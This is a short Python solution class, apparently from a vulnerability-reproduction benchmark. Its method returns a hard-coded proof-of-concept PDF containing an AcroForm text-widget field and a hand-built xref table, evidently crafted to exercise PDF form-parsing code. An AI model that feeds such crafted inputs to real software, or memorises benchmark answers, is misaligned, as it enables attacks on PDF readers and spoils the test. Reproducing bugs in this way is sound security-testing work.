class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b"""%PDF-1.4

1 0 obj
<< /Type /Catalog /AcroForm << /Fields [2 0 R] >> >>
endobj

2 0 obj
<< /FT /Tx /Type /Annot /Subtype /Widget /Rect [0 0 10 10] /T (test) >>
endobj

xref
0 3
0000000000 65535 f 
0000000009 00000 n 
0000000080 00000 n 
trailer
<< /Size 3 /Root 1 0 R >>
startxref
160
%%EOF"""
        return poc